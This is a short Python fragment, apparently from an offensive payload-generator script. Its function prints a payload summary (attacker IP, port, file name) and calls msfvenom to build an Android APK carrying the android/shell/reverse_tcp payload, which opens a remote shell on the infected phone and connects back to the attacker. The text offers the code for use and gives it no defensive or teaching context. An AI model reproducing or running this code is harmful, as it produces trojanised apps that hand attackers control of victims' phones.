...
def and_net_tcp():
    os.system("clear")
    print(banner)
    print("Using: android/shell/reverse_tcp")
    ...
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: android/shell/reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p android/shell/reverse_tcp LHOST="+ip+" LPORT="+port+" > "+name+".apk")
